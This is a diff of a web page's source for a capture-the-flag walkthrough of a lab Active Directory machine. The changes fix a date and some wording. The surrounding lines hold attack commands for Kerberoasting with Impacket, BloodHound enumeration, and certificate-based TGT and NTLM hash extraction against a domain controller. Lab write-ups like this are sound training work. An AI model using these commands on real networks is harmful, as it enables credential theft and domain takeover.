@@ -12,7 +12,7 @@ const WcorpWalkthrough = () => {
     id: 'wcorp-walkthrough',
     title: 'Wcorp Walkthrough',
     excerpt: 'Wcorp Walkthrough - Wcorp is a Windows-based Active Directory machine that involves enumerating user accounts, exploiting Kerberos vulnerabilities (AS-REP Roasting and Kerberoasting), performing lateral movement via certificate theft and abuse, and escalating privileges through DCSync to gain domain administrator access.',
-    date: 'Sep 02, 2025',
+    date: 'Sep 05, 2025',
     tags: ['hc', 'smb', 'ad', 'windows', 'asreproast', 'dcsync', 'kerberoasting', 'password-cracking'],
     difficulty: 'Hard',
     os: 'Windows',
@@ -183,7 +183,7 @@ Running \`bloodHound-python\` with \`svc_backup\` credentials to enumerate the A
 bloodhound-python -u 'svc_backup' -p <REDACTED> -d wcorp.hc -ns 172.16.13.103 -gc dc-01.wcorp.hc -c all --zip
 \`\`\`
 
-Using Impacket’s \`GetUserSPNs\` tool to query Service Principal Names (SPNs) in the domain using the \`svc_backup\` credentials. SPNs identify services running under domain accounts, and by targeting them, the \`-request\` flag triggers Kerberos pre-authentication to retrieve their hashes. In this case, it returns the hash of the \`svc_web\` service account.
+Using Impacket \`GetUserSPNs\` tool to query Service Principal Names (SPNs) in the domain using the \`svc_backup\` credentials. SPNs identify services running under domain accounts, and by targeting them, the \`-request\` flag triggers Kerberos pre-authentication to retrieve their hashes. In this case, it returns the hash of the \`svc_web\` service account.
 \`\`\`bash
 impacket-GetUserSPNs wcorp.hc/svc_backup:<REDACTED> -dc-ip 172.16.13.103 -request
 \`\`\`
@@ -217,7 +217,7 @@ python3 gettgtpkinit.py wcorp.hc/john.doe -cert-pfx ../21xt5tDC.pfx -pfx-pass fd
 \`\`\`
 ![Kerbrute User Enumeration](/images/writeups/wcorp/13.png)
 
-Authenticating as \`john.doe via\` with Evil-WinRM using the NTLM hash for authentication.
+Using \`getnthash.py\` to extract the NTLM hash of \`john.doe\` from a Kerberos TGT.
 \`\`\`bash
 export KRB5CCNAME=john.doe.ccache
 python3 getnthash.py wcorp.hc/john.doe -key 5c1a753f3dca1b07c5e6a1dc5eae7e52fe578eef2b873fc1e7afe828f26911ce
